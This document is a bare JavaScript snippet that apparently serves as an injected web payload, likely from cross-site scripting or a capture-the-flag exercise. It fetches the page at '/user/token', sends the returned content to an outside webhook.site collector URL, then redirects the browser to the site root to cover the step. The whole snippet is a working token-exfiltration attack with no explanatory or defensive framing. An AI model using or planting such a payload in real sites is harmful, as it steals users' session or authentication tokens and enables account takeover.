fetch("/user/token")
  .then(r => r.text())
  .then(html => {
    fetch("https://webhook.site/c6737c07-be88-4d90-a707-7f11222282c4?c=" +encodeURIComponent(html)).then(window.location.href="/");
  });
